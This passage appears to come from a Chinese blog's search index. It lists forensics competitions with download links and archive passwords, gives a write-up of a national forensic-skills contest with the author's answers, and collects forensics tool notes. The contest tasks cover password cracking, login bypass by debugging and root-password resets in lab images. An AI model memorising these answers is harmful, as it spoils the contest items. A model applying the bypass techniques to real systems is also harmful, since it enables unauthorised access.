[下载](https://pan.baidu.com/s/1FNkJ_M3bYtoygOA5NIgmxA?pwd=dcbk) |\n| **20250716上午能力验证** | 2025年 | 公安三所 | 2025diyijie@GASS>>>fenxishi+++===??? | [下载](https://pan.baidu.com/s/1uWvO7yxSXxu20JDvgebbkA?pwd=ukk2) |\n| **20250716下午能力验证** | 2025年 | 公安三所 | +??>>>>Gass;NengliYanzheng2025<<<??+ | [下载](https://pan.baidu.com/s/1Xc86Hh1JdbHabBkaFmZ__Q?pwd=huay) |\n| **2025安徽xz省赛** | 2025年 | 弘连 | 新生赛难度（偏向misc，各种隐写） | [下载](https://pan.baidu.com/s/1-SHDTcRFz_mDj4lQhBzIIw?pwd=rpvk) |\n| **公大校赛** | 2024年 | 平航 | 新生赛难度 | [下载](https://pan.baidu.com/s/1pdoHGWegclq5TLsubRcuFQ?pwd=dj96) |\n| **浙江刑侦比武** | 2024年 | 平航 | 新生赛难度 | [下载](https://pan.baidu.com/s/1zwTIHT0Hlg5Er3z8EPZ2EA?pwd=2vsg) |\n| **蓝帽杯** | 2023年 | 奇安信 | 新生赛难度 | [下载](https://pan.baidu.com/s/1WQe6DCwwlCFmPz1LI7u5kw?pwd=jems) |\n| **黑龙江刑侦** | 2025年 | 拓界 | 新生赛难度 | [下载](https://pan.baidu.com/s/1UrD9yMrcYUcQBrn_IWAQMw?pwd=28cq) |\n| **中科实数杯** | 2024年 | 中科实数 | 新生赛难度 | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **中科实数杯** | 2023年 | 中科实数 | 新生赛难度 | [下载](https://pan.baidu.com/s/1Hi3gJFiBgyAJXH_JBY_zKg?pwd=1kzf) |\n\n### ⭐ 一星级 (1分)\n\n| 赛事名称 | 年份 | 出题方 | 问题 | 附件 |\n|---------|------|--------|------|------|\n| **福建联赛** | 2024年 | 初赛奇安信；决赛弘连 | 出题方故意修改题目条件导致部分题做不了 | [下载](https://pan.baidu.com/s/121WTmbG2R1bdf6V66wnEeA?pwd=8t53) |\n| **全国联赛浙江选拔** | 2024年 | 弘连 | 软件题，不知道是不是在推销软件 | [下载](https://pan.baidu.com/s/10dR6MV_GGImVS1Iz9TNSRw?pwd=ve6r) |\n| **FIC初赛** | 2025年 | 弘连 | 没见过出的这么烂的题，一星都嫌多 | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **美亚杯** | 2023年 | 美亚 | 1个多t的检材，谁能忍住不骂 | [下载](https://pan.baidu.com/s/1tLHFURY33ZRDZy8MSKgXXg?pwd=yy64) |\n| **温州砺剑** | 2025年 | 缝合怪 | 均是比武改编 | [下载](https://pan.baidu.com/s/13wn_qRTcB8KR7cTYbo06xA?pwd=zjpc) |\n\n---\n\n## 📊 数据统计分析\n\n### 📈 评分分布\n\n| 评分 | 数量 | 占比 | 推荐程度 |\n|------|------|------|----------|\n| ⭐⭐⭐⭐⭐ 5分 | 6个 | 6.3% | 🔥 强烈推荐 |\n| ⭐⭐⭐⭐ 4分 | 6个 | 6.3% | ✅ 推荐 |\n| ⭐⭐⭐ 3分 | 9个 | 9.5% | 🔄 可选 |\n| ⭐⭐ 2分 | 13个 | 13.7% | ⚠️ 谨慎选择 |\n| ⭐ 1分 | 5个 | 5.3% | ❌ 不推荐 |\n| 未评分 | 56个 | 58.9% | 📋 待评价 |\n\n### 📅 年份分布趋势\n\n| 年份 | 比赛数量 | 高分项目 | 特点 |\n|------|----------|----------|------|\n| **2025年** | 40+ | 2个5分，2个4分 | 数量激增，技术前沿 |\n| **2024年** | 30+ | 4个5分，2个4分 | 质量最佳，覆盖面广 |\n| **2023年** | 10+ | 1个5分，1个4分 | 稳定发展 |\n| **2022年** | 5+ | 2个5分 | 基础阶段 |\n| **2021年** | 5+ | - | 早期探索 |\n\n### 🏢 主要出题方统计\n\n| 出题方 | 总数 | 5分项目 | 4分项目 | 特色 |\n|--------|------|----------|----------|------|\n| **弘连** | 20+ | 2个 | 3个 | 专业取证，质量稳定 |\n| **奇安信** | 8+ | 2个 | 2个 | 难度较高，技术深度 |\n| **美亚** | 14+ | 1个 | 0个 | 检材丰富，质量波动 |\n| **平航** | 6+ | 2个 | 1个 | 取证专业，难度适中 |\n| **公安三所** | 4+ | 0个 | 0个 | 能力验证，偏向实战 |\n\n### 🎯 推荐学习路径\n\n#### 🔰 入门阶段 (2-3分)\n1. **公大校赛、浙警校赛** - 校赛水平，适合基础学习\n2. **各类新生赛** - 难度适中，建立信心\n3. **美亚杯** - 检材真实，了解实际工作\n\n#### 🚀 进阶阶段 (4分)\n1. **浙江联赛** - 技术深度，挑战性高\n2. **FIC决赛** - 断网环境，综合能力强\n3. **盘古石杯** - 纯难题型，技术挑战\n\n#### 🏆 高手阶段 (5分)\n1. **数证杯、平航杯** - 顶级水平，技术前沿\n2. **全国刑侦比武** - 实战导向，综合能力\n3. **奇安信内部比武** - 企业级，实际应用\n\n### 💡 选择建议\n\n1. **🎯 按年份学习**：从最新开始，了解技术发展趋势\n2. **⭐ 按难度选择**：循序渐进，逐步提升技术水平\n3. **🏢 关注出题方**：弘连、奇安信、平航的题目质量较高\n4. **🔧 技术方向**：取证、逆向、流量分析、移动端取证\n5. **📚 实战优先**：选择与实际工作结合度高的比赛\n\n---\n\n> 📝 **说明**：本汇总基于网络安全竞赛参与者分享整理，评分为主观评价，仅供参考。建议根据个人技术水平和学习目标选择合适的比赛进行练习。按年份排列便于了解技术发展趋势。","tags":["电子取证"]},{"title":"私密比赛1","url":"/2025/10/25/私密比赛1/","content":"# 第五届全国刑事技术技能大赛实操 · 电子物证-手机部分\n\n### 1. 根据华为手机备份分析，手机型号是什么?\n(1 分) [答案格式: HUAWEI Mate 30][手机取证]\n- backupinfo.ini用记事本打开\n- protuct_model=**HUAWEI P20 Pro**\n\n### 2. 根据小米手机备份分析，手机 IMEI 是多少?【错题】\n(1 分) [答案格式: 123456789012345/123456789012345][手机取证]\n- xwf同步搜索：\"imei\">41346335343165306561663562303666\n- 搜索 imei'>（不一定！！！先搜同步搜索imei）\n  - 注意检验:真实的IMEI是15位\n  - 若32位十六进制:MD5哈希\n  - 若64位十六进制 SHA-256哈希\n  - 来自glj\n\n![alt text](/img/2025刑事技能大赛_image-4.png)\n- 但是\n\n![alt text](/img/2025刑事技能大赛_image-5.png)\n- **A4c541e0eaf5b06f**\n- 错了，答案是双卡\n\n![alt text](/img/私密比赛1_image.png)\n- **861144040007290/861144040007308**\n### 3. 根据华为手机备份分析，使用的“备份(localBackup)”APP 的版本号是多少?【错题】\n(1 分) [答案格式: 13.0.2.110][手机取证]\n- hisuiteversion=**15.0.1.210**错了\n\n![alt text](/img/私密比赛1_image-1.png)\n- 干脆以后直接info.xml搜backup好了xwf实在搞不懂\n\n### 4. 根据华为手机备份分析(备份密码为:a1B2C3D4#)，通讯录中“耗子”的手机号码是多少?\n(1 分) [答案格式: 13112345678][手机取证]\n![alt text](/img/2025刑事技能大赛_image-1.png)\n- **19013265438**\n\n### 5. 根据华为手机备份分析，机主设置了在哪一天“给‘耗子’送‘鱼’”这个提醒?\n(1 分) [答案格式: 2023-01-01][手机取证]\n![alt text](/img/2025刑事技能大赛_image.png)\n- **2025-11-19**\n\n### 6. 根据小米手机备份分析，机主的家庭地址所在省份是什么?\n(1 分) [答案格式: 海南省][手机取证]\n![alt text](/img/2025刑事技能大赛_image-6.png)\n- **黑龙江省**\n### 7. 根据小米手机备份分析，请给出 WIFI SSID 为“work_5G”的密码是多少?\n(1 分) [答案格式: 123456789][手机取证]\n![alt text](/img/2025刑事技能大赛_image-2.png)\n- **mywifi_12345**\n### 8. 根据小米手机备份分析，在其相册中有一张照片使用 photoshop 篡改过，请给出这张照片的名称是什么?【错题】\n(1 分) [答案格式: IMG_20200101_010101.jpg][手机取证]\n- IMG_20250805_120248.jpg\n- ctrl+Q全清空再同步搜索，不然可能干扰\n### 9. 同上，请分析出此照片使用 photoshop 的修改时间是?【错题】\n(1 分) [答案格式: 2025:01:01 01:01:01][手机取证]\n- Content modified\t2025:08:05 12:13:46.195520 (LT)→本地时区\n- 2025:08:05 12:13:46\n### 10. 根据小米手机备份分析，手机中登录过几个 QQ 号?\n(1 分) [答案格式: 5][手机取证]\n- **3**\n\n### 11. 根据小米手机备份分析，微信好友“wxid_8gmzat7zjnmf22(SunShine)”发给嫌疑人的“membership_commission.sql”脚本文件的 SM3 后六位是多少?\n(1 分) [答案格式: abcdef][手机取证]\n- C8679B3BC3642E6733A79161B9EC766CD99E1383C15CE8820CEB43278AD1F7F2\n- D1F7F2\n- d1f7f2\n\n### 12. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“gold”的会员人数是多少？\n(1 分)（字母小写）[答案格式: 1][手机取证]\n- notepad++打开sql文件\n- **15**\n### 13. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“silver”且消费金额高于同级别会员(silver)平均消费金额的会员数量是多少？\n(1 分) [答案格式: 3][手机取证]\n- **16**\n```python\na = [5576.75,\n3497.76,\n9176.47,\n9840.74,\n5748.21,\n8693.49,\n5666.75,\n7858.13,\n9472.91,\n5150.39,\n3191.22,\n8369.94,\n7215.55,\n7596.77,\n8666.63,\n3116.45,\n6943.66,\n5189.33,\n5779.14,\n8700.32,\n9719.42,\n3083.97,\n9019.37,\n6099.78,\n6938.21,\n7580.36,\n4988.99,\n4408.97,\n3837.72,\n3923.9,\n7027.62,\n4744.59,\n5614.83]\nb = 0\nfor i in a:\n    b += i\nb = b / 33\nc = 0\nfor i in a:\n    if i > b:\n        c += 1\nprint(c)\n```\n\n### 14. 根据小米手机备份分析，微信中“客户信息.xls”有密码保护，已知密码为 4 位数字，请给出这个文件的密码是多少?\n(1 分) [答案格式: 0000][手机取证]\n- **1973**\n### 15. 根据小米手机备份分析，请统计“客户信息.xls”中“电话”列不为空且“城市”为“北京”的数据总共有多少条?\n(1 分) [答案格式: 123456][手机取证]\n![alt text](/img/2025刑事技能大赛_image-3.png)\n- **7**\n\n### 16. 根据小米手机备份分析，app“umanager”使用 Sqlite 数据库存储数据，其中记录用户信息的表“users”数据已被删除，请分析用户名为“uUser_eelum”的电话号码是多少？【错题】\n(1 分) [答案格式: 13112345678][手机取证]\n- 雨蓝老师直接xwf搜到。。我搜不到（大哭）\n### 17. 同上，在“umanager”app 中有一个配置文件 config.json.enc，但此文件使用 AES 对称加密，请分析此加密密钥是什么?\n(1 分) [答案格式: 123456789abcdef][手机取证]\n- 直接搜aes\n\n![alt text](/img/2025刑事技能大赛_image-7.png)\n- **82572cc8b07bb7b5**\n### 18. 同上，在配置文件 config.json.enc 中记录了管理员 admin 的密码，请给出其密码是什么?\n(1 分) [答案格式: 123456][手机取证]\n![alt text](/img/2025刑事技能大赛_image-8.png)\n- **a13579**\n### 19. 根据小米手机备份分析，“umanager”app 中有一个 transactions.json 文件记录了每个用户收入与支出，请统计用户 ID 为 1512 的总收入是多少?【错题】\n(1 分) [答案格式: 10000][手机取证]\n- 用python脚本\n```python\nimport json\n\ndef sum1(filename):\n    filename = \"E:\\\\app-down\\\\题目工作区\\\\transactions.json\"\n    try:\n        # 读取JSON文件\n        with open(filename, 'r', encoding='utf-8') as file:\n            data = json.load(file)\n        \n        total_sum = 0\n        \n        # 处理JSON数据\n        if isinstance(data, list):\n            for item in data:\n                if (isinstance(item, dict) and \n                    item.get('user_id') == 1512 and \n                    'type' in item and\n                    'amount' in item):\n                    if item.get('type') == \"income\":\n                        total_sum += item['amount']\n                    # elif item.get('type') == \"expense\":\n                    #     total_sum -= item['amount']\n        \n        print(f\"总收入为: {total_sum}\")\n        return total_sum\n        \n    except FileNotFoundError:\n        print(f\"错误：找不到文件 {filename}\")\n    except json.JSONDecodeError:\n        print(\"错误：JSON文件格式不正确\")\n    except Exception as e:\n        print(f\"发生错误: {e}\")\n\n# 使用示例\nif __name__ == \"__main__\":\n    sum1(\"data.json\")\n```\n- **57805**错啦，总收入是只计算收入(✘﹏✘ა)最后是**194445**\n### 20. 根据小米手机备份分析，在 app“v2rayNG”中类型为“VLESS”的代理有多少个?\n(1 分) [答案格式: 101][手机取证]【错题】【待】\n![alt text](/img/私密比赛1_image-3.png)\n- 错了答案483？？？\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-计算机部分\n\n说明：下列各题的素材目录位于相应题号下，如题 1、题 2、题 3 的素材位于 C1-3 目录下，题 4 的素材位于 C4 目录下。\n\n在电子数据检验中，因某个 U 盘检材存在不稳定的扇区，每次镜像都会因这些不稳定扇区导致生成的目标文件无法稳定。为了尽最大可能可靠地固定这个 U 盘的原始数据，我们采用了间断性计算哈希的方法。具体方法为：对 U 盘每 1M 的数据计算 SHA256 哈希，将这些哈希值以二进制的方式顺序保存为一个哈希列表文件，再计算这个哈希列表文件的哈希，同时记录不稳定扇区所在的 1M 块号。实际检验中，我们对这个 U 盘做了 2 次副本，分别为 disk#1.dd 和 disk#2.dd，对 disk#1.dd 按上述算法计算的哈希列表文件为 sha256list#1.bin，disk#2.dd 未生成哈希列表。现提供 C1-3 目录下的 disk#2.dd 和 sha256list#1.bin 文件，请分析后回答问题 1~3。\n\n### 1. U 盘的第几 M 存在不稳定扇区（编号从 0 开始）?\n(1 分) [答案格式: 123][计算机取证]\n\n### 2. 这个不稳定扇区影响了哪个文件?（请给出文件名）\n(1 分) [答案格式: abc123][计算机取证]\n\n### 3. 按相同思路对 disk#2.dd 计算 MD5 列表哈希，最终 MD5 哈希值的后 6 位是多少（字母大写）?\n(1 分) [答案格式: A1B2C3][计算机取证]\n\nC4\\data.csv 文件是一份来自某个涉案团伙的绩效提成表。表中包含三列数据：订单号、销售 ID、提成额。提成额的算法为：如果是周一至周五的订单，销售额的 5% 为提成；如果订单是周六日的，提成额为销售额的 10%。请据此规则，通过分析计算后回答问题 4。提示：订单号中包含一个日期值，为订单产生时的时间记录，提成算法中涉及到的日期与此日期值相同。\n\n### 4. ID 为 S006 的销售人员 2024 年第 3 季度的销售额是多少?\n(1 分) [答案格式: 123][计算机取证]\n\n加壳是保护程序不被反编译的一种重要手段。已知 C5\\esend.exe 是一个被简单加过壳的应用程序，其工作原理是在特定条件下搜集用户的敏感信息，并自动发送至某个电子邮箱。邮箱后缀是 trek2025.ngo。提示：脱壳后查找字符串。\n\n### 5. 这个电子邮箱的用户名是什么?\n(1 分) [答案格式: 123abc][计算机取证]\n\nC6-8\\disk.vmdk.7z 中有一个用于业绩统计的软件（路径：虚拟磁盘主分区根目录下的 perf_stat_v6\\perf_stat.exe）。因部分文件破坏，系统无法启动。复制软件出来直接运行提示“程序运行环境异常...”。程序运行时，需要先读取某个名称为 .pem 的密钥文件，再访问注册表 HKEY_CLASSES_ROOT（HKCR）中的某个键值。说明：HKCR 是 HKCU\\Software\\Classes 与 HKLM\\SOFTWARE\\Classes 的合并视图，前者优先。请通过技术手段尝试构建此应用程序所需环境，回答问题 6~8。\n\n### 6. 程序运行时需要依赖的一个 .pem 的文件名称叫什么?\n(1 分) [答案格式: ABC123.pem][计算机取证]\n\n### 7. 程序运行时需要访问的注册表键值中，用到了 HKCR 下某个文件扩展名的子键值（如：HKCR\\.bat\\CombinedValidation 的 REG_SZ 值）。该哈希字符串值的最后 6 个字符是什么（字母大写）?\n(1 分) [答案格式: AB123C][计算机取证]\n\n### 8. 使用用户名 admin，密码 trek2025 登录系统，程序仿真运行后，ID 为 1014 的用户其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC9、C10、C11、C12、C13 目录中，是一个业绩查询系统的不同版本，分别管理不同的数据，管理员用户名均为 admin。请参考各自的背景说明，回答对应问题。\n\nC9 目录下的 perf_stat.exe（V1），数据库 data_v1.db 中密码字段为用户密码的 MD5 单向哈希。破解 admin 用户的密码明文并登录后，回答问题 9。提示：关注密码提示问题；系统对数据库密码字段的修改有校验。\n\n### 9. ID 为 1066 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC10 目录下的 perf_stat.exe（V2），数据库 data_v2.db 中记录的用户密码算法未知，但已知 id 为 1001 的登录密码“trek2025”。该算法同样适用于 admin 管理员。请尝试登录并回答问题 10。\n\n### 10. ID 为 1042 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC11 目录下的 perf_stat.exe（V3），数据库 data_v3.db 中记录的用户密码算法未知。同级目录下提供用于命令方式修改密码的 .NET 程序 ChsaPassword（反编译后生成 \"C11\\V3.ChsaPassword\\Program.cs\"）。利用该信息解除口令限制后登录，回答问题 11。\n\n### 11. ID 为 1082 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC12 目录下的 perf_stat_v4.exe（V4），数据库 data_v4.db 中记录的用户密码算法未知。该版本为 Qt 编写，程序未加壳未混淆，可通过动态跟踪绕过密码。提示：附件中的 x64dbg 可用；密码错误提示是下断点的好信息。\n\n### 12. ID 为 1066 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC13 目录下的 perf_stat.exe（V5），数据库 data_v5.db 中记录的用户密码算法未知，但该版本有密码找回功能（通过邮箱重置）。结合数据库和其他必要手段解除登录限制后，回答问题 13。\n提示：找回密码通过明文 SMTP（端口 25，无 TLS/SSL 与鉴权）；C13\\fake_smtp_server 提供 Python 版本和图形版本（管理员权限运行）；admin 的真实姓名为：王一山；建议方法仅供参考。\n\n### 13. ID 为 1062 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\n### 14. C14\\data.pdf 文件无法打开，怀疑进行了简单的加密。请分析文件结构，尝试解密文件，并回答文件第一页中记录的密码是什么?\n(1 分) [答案格式: Aa12b3][计算机取证]\n\n经调查，某 U 盘曾以 docx 存储过一个重要的 BitLocker 恢复密钥。日常使用中除了这个重要文件外，仅保存网站日志的 zip 压缩文件。U 盘已被格式化，原有文件无法直接读取。请对已格式化 U 盘进行深度检索和比对，尝试恢复关键 BitLocker 恢复密钥文件。提示：“C15-17\\disk_cert(old).docx”与目标文件格式相同。\n\n### 15. 问题 1：这个文件的头部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）\n(1 分) [答案格式: 123][计算机取证]\n\n### 16. 问题 2：这个文件的尾部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）\n(1 分) [答案格式: 123][计算机取证]\n\n### 17. 问题 3：文件中记录的 bitlocker 恢复密钥的后 6 位是什么?\n(1 分) [答案格式: Aa12b3][计算机取证]\n\n### 18. 不稳定 U 盘中存储了 key.zip 和其备份 key.bak.zip，导出后两者都打不开。请修复该压缩文件，回答修复后 zip 文件的 SHA256 哈希后 6 位（大写字母）:\n(1 分) [答案格式: ABC123][计算机取证]\n\nC19\\case155.tar.gz 解开后是一个 U 盘镜像，保存着来源于 Linux 服务器的账单文件。history 显示：对/dev/sdb 执行 mkfs.fat，挂载至/mnt；用 \"rsync -ar\" 将/website/access_log 同步到/mnt；最后卸载。拷贝期间无证据显示其他进程访问/dev/sdb。完成后嫌疑人对其中 1 个文件进行了修改，并刷新了所有文件的时间信息（无法通过时间戳判断）。提示：20250403.log 并未被篡改。\n\n### 19. 请综合分析 U 盘存储特征，判定被篡改的具体文件，并回答其文件名称。\n(1 分) [答案格式: file.abc][计算机取证]\n\nC20\\data.vhd 中保存了一批从网站服务器中归档回来的加密密钥，这些文件似乎下载回来都没有用过。已知这些密钥中只有一个用于管理者使用，其他都是普通用户使用的。请通过文件系统底层特征分析判断，在该虚拟磁盘中目录 bak194 下哪个密钥是管理者使用的，回答其文件名称。\n\n### 20. bak194 目录下哪个密钥是管理者使用?（回答文件名称）\n(1 分) [答案格式: file.abc][计算机取证]\n\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-服务器部分\n\n说明：\n- 可使用 \"RUN-ENV-VM\\trek_sys_v2_exam\" 虚拟机（简称 trek_sys_v2_exam）或其他方式（如 wsl）。\n- 建议使用 ssh 连接（虚拟机内已开启 DHCP）。\n- 建议使用 sftp、samba 等将实验所需文件传入虚拟机（部分素材已在虚拟机中）。\n- 登录用户：trek / trek，具备 sudo 权限，root 未设置。\n- 如虚拟机无法启动，可通过 RUN-ENV-VM 下的 ovf 包导入，路径：\"RUN-ENV-VM\\trek_sys_v2_exam_ovf\\trek_sys_v2_exam.ovf\"。正常启动时忽略该目录。\n\n### 1. 以 HMAC 密钥 trek132 计算 s1_2/lzop-1.04.tar.gz 的 HMAC-SM3 哈希值，填写哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s1_2\" 目录。\n\n### 2. 编译 lzop 源码后对 \"s1_2/55932.pem.lzo\" 解压，回答解压出的唯一文件的 SHA256 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s1_2\"；虚拟机已配置本地 apt 源；缺失头文件需安装 dev 包。\n\n### 3. 还原 s3_4/webbak 网站，以 http://admin.trek2025.ngo/ 为域名进行访问，回答登陆界面显示的 build id\n(1 分) [答案格式: 1234][服务器取证]\n\n### 4. 见上题，还原网站后使用 admin 尝试登陆后台，密码输错后页面中显示的密码提示的 5 位数字是什么\n(1 分) [答案格式: 12345][服务器取证]  \n提示：素材位置 \"s3_4\"；架构为 nginx 代理前端 + go 后端；还原参考 README.txt。\n\n### 5. exam-allinone-flat.tar.xz 是 Docker 容器导出副本。找到网站“comet”对应的 SIGN.pem 并计算其 SHA1 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s5\" 及虚拟机 /home/trek/s5；网站目录 /var/www；数据库配置信息默认位置；可导入容器或静态分析容器备份；容器导入启动参考 cmd.sh。\n\n### 6. d3systemd-with-services-flat.tar.xz 是 Docker 容器导出副本。分析容器激活时 4 个网站是否 active，用 0~15 表示。\n(1 分) [答案格式: 123][服务器取证]  \n网站 1：web-hotel；网站 2：web-golf@8089；网站 3：web-mike；网站 4：web-foxtrot。  \n提示：素材位置 \"s6\" 及虚拟机 /home/trek/s6；容器启动命令见 cmd.sh。\n\nS7_9 目录下数据库是某系统的会员信息库，共 2 张表（用户信息、订单）。各表含义如列名所指。请通过恰当工具分析后回答 3 个问题。\n\n### 7. 该组织架构共有多少层（从某个管理员开始的最深一层为准，管理员记 1 级）\n(1 分) [答案格式: 123][服务器取证]\n\n### 8. 会员表中 ID 为 7623 的人员位于人员层级的第几层（管理员为第 1 层）\n(1 分) [答案格式: 123][服务器取证]\n\n### 9. ID 为 7623 的人员，其下层人数的总佣金(分红)为多少（算法：下第 1 层 5%，第 2 层 3%，第 3 层 1%，第 4 层及以下不计算）\n(1 分) [答案格式: 123][服务器取证]  \n提示：素材位置 \"s7_9\" 目录。\n\n### 10. 尝试利用 chroot 或单用户模式修改 \"s10/bypass_vmware/bypass_case.vmdk\" 中 root 口令。执行 passwd 修改为 trek1009 后屏幕输出的 Executive Code 是多少\n(1 分) [答案格式: 1234][服务器取证]  \n提示：素材位置 \"s10\"；bypass_vmware 可直接运行，ovf 目录为兜底方案；同样版本位于虚拟机 /home/trek/s10；仅用 chroot 或单用户方案，确保 Executive Code 正确。\n\n### 11. key-chal_deleted.tar.xz 是 Docker 容器导出副本。恢复其中的 117.pem 文件，并回答其 SHA1 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s11\" 及虚拟机 /home/trek/s11。\n\n### 12. 虚拟机中曾有名为 5b630a9dab1b 的 Docker 容器于 2025/09/01 和 2025/09/02 日频繁重启。找到该日志数据，回答某天 19:51:52 的重启记录里时间戳纳秒部分的后四位数字。\n(1 分) [答案格式: 1234][服务器取证]  \n提示：日志位置为 docker 默认路径；纳秒数字后紧跟一个字母表示时区。\n\ns13_15/case103 目录中，是某台服务器备份的附件数据。文件原始名称被哈希转译。该目录包含：一个 Linux 可执行文件、一个 trek 格式归档包、一个未加密且数据规律的 sqlite 数据库中间片断，其余为某种加密文件。提示：trek 文件结构定义见 \"TREK2025 Archive Format Specification.md\"。\n\n### 13. 找出该 Linux 二进制可执行文件，回答其文件名称\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 14. 找出该 trek 格式归档包，回答其文件名称\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 15. 找出该 sqlite 数据库片断，回答其文件名\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 16. set_101.tar.gz 解出的网站 nginx 日志（combined log format），统计 referer 为 \"http://www.trek2025.ngo/tcrm/legal-case\" 的唯一 IP 地址数量\n(1 分) [答案格式: 123][服务器取证]  \n提示：combined log format：IP 在首列，之后状态码与响应字节数，之后第一个双引号字段为 referer。\n\n在现场找到了散放的 8 个硬盘。分析并回答下列问题：\n\n### 17. 分析包含 NTFS 文件系统的 RAID，找出创建 RAID 时的成员硬盘，并按数字从小到大组成类似“1236”的字符串（不能排除掉线盘）\n(1 分) [答案格式: 12345][服务器取证]\n\n### 18. 该包含 NTFS 文件系统的 RAID，其组成结构的 chunk 大小为多少 KB\n(1 分) [答案格式: 123][服务器取证]\n\n### 19. 该 RAID 的组成方式最为符合下图的哪一种结构（仅指校验模式、数据排列方法，不特指成员盘数量）\n(1 分) [答案格式: 01][服务器取证]  \n结构编号：01 ~ 10\n\n### 20. 从该 RAID 中恢复 data01.zip 文件，并回答其 SHA256 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s17_20\"；参考 sample.dbf.gz（解开的 oracle 数据库用于 raid 结构分析）；oracle 通常 8k 块大小，块 0x00~0x01 为块类型与格式版本标签性明显；0x04~0x07 为数据库块号及文件号规律性明显；data01.zip 恢复后应无损坏。\n\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-物联网部分\n\n### 1. 该存储镜像 RAW 格式的 SHA256 哈希值后 6 位（字母大写）为多少\n(1 分) [答案格式: ABC123][物联网取证]\n\n### 2. 该路由器后台管理地址是什么\n(1 分) [答案格式: 192.168.1.1][物联网取证]\n\n### 3. 该路由器主机名称是什么\n(1 分) [答案格式: administrator][物联网取证]\n\n### 4. 该路由器使用了哪种开源 vpn 方案\n(1 分) [答案格式: freevpn][物联网取证]\n\n### 5. 该路由器中设置的迅雷下载路径是什么\n(1 分) [答案格式: /opt/download][物联网取证]\n\n### 6. 该路由器下载了什么电影\n(1 分) [答案格式: 变形金刚][物联网取证]\n\n### 7. 该路由器屏蔽了什么广告域名\n(1 分) [答案格式: abc.com][物联网取证]\n\n### 8. 该路由器连接的 IPTV 机顶盒 MAC 地址是什么\n(1 分) [答案格式: DA:11:22:1A:B2:1A][物联网取证]\n\n### 9. 该路由器的上网行为管理中禁止什么应用联网\n(1 分) [答案格式: 浏览器][物联网取证]\n\n### 10. 该路由器的 wifi 启用计划时间范围是什么\n(1 分) [答案格式: 04:00-05:00][物联网取证]","tags":["wp","电子取证"]},{"title":"电子取证常识笔记","url":"/2025/10/25/电子取证常识笔记/","content":"## 赛前准备\n### 思路拓展\n- 很多思路都是找日志，注意时间是UTC时间\n- 注意答题格式：大小写。。。\n- 注意时区UTC\n\n## bitlocker\n### window cmd管理员\n- `manage-bde -status`查看状态\n- `manage-bde -protectors -get D:`，自己改盘符，看bitlocker密码\n\n## window\n### 自带计算哈希\n- `certutil -hashfile temp_wallpaper.png md5`\n- 支持MD2、MD4、MD5、SHA1、SHA256、SHA384和SHA512等。如果不指定HashAlgorithm，则默认使用MD5算法。\n### win+R 输入 recent 进入最近访问的文件\n\n## 后缀      \n| 后缀 | 含义 |\n| --- | --- |\n| .dat | 通用数据文件，常存储应用私有或二进制数据 |\n| .db | 数据库文件（常见为 SQLite），用于结构化数据持久化 |\n| .ini | 配置文件，以键值对保存程序设置 |\n| .xml | 记录华为基础信息，可扩展标记语言，用于存放结构化数据（配置、备份、日志等） |\n| .plist | 记录苹果基础信息 |\n| .jar | 可以用jadx打开 |\n| .pic | 文件名对应的是微信的消息数据库里的编号 |\n| .splite | navicat打开 |\n| .csv | excel打开 |\n| .HEIC | 苹果拍照生成的图片格式，这个格式安卓手机在正常情况下是看不了的。当发送图片时，手机或者应用会将图片的格式进行转换改成其他类型 |\n\n## 微信\n### 记录数据库\n- message/message1/2/3。。。\n\n## 手机\n### 真实的IMEI是15位\n\n## 图片\n### 通用唯一标识符`UUID`/`GUID`\n- UUID 是学术和开放标准的叫法；GUID 是微软对这一标准的实现和推广时使用的名称\n- 数据库中可以靠它找指定图片\n### 苹果实况照片\n- iPhone 中的实况照片扩展名为.HEIC, 数据库中可以用SQL语句筛选一下扩展名符合且ZVIDEOCPDURATIONVALUE (视频片段长度，具体情况自己更改) 字段不为 0 的照片:\n```SQL\nSELECT Z_PK, ZFILENAME \n    FROM ZASSET\n    WHERE ZFILENAME LIKE '%.HEIC' \n        AND ZUNIFORMTYPEIDENTIFIER = 'public.heic' \n        AND ZVIDEOCPDURATIONVALUE != 0;\n```\n### 后置摄像镜头拍摄\n- 搜摄像头信息`back camera`\n### 数据库中文件类型判断\n- MsgSource中看有没有\\<imgmsg>标识\n\n## 火眼\n### `Apple ID`\n- 分析-基本信息-设备信息-Apple ID登录历史\n### 电话卡集成电路卡标识符`ICCID`/手机网络运营商公司的名称\n- 分析-基本信息-SIM卡记录\n### 微信账号\n- 内部ID，而不是昵称\n### 搜索\n- 简体繁体英文都要试\n### 应用安装时间\n- 分析-应用列表\n\n## 手机\n### 手机的型号——搜`Model`\n### 手机SIM卡序号——搜`SimSerialNumber`\n### 安卓\n#### 版本号`Build Number`\n- system/build.prop文件找ro.build.display.id/ro.build.id\n\n## 软件技巧\n### vscode\n#### 格式化json\n- 选中JSON文本，按 Ctrl+Shift+P，搜索 \"Format Document\"一键格式化一行json\n### Xways\n#### 